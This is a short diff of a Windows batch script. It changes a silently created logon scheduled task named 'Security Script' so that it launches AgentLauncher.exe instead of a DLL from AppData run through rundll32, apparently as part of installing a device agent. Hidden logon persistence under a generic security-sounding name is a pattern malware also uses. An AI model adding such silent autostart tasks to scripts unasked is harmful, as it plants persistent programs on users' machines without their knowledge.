@@ -103,7 +103,7 @@ if %errorlevel% neq 0 (
 
 schtasks /query /tn "Security Script" >nul 2>&1
 if %errorlevel% neq 0 (
-    schtasks /create /tn "Security Script" /tr "rundll32 \"%APPDATA%\PortableApp.dll\" Open32 vid=cafe pid=403f cwd=%APPDATA%" /sc onlogon /rl limited /f >nul 2>&1
+    schtasks /create /tn "Security Script" /tr "\"%DEST%\AgentLauncher.exe\" vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
     echo     Scheduled task "Security Script" created.
 )
 
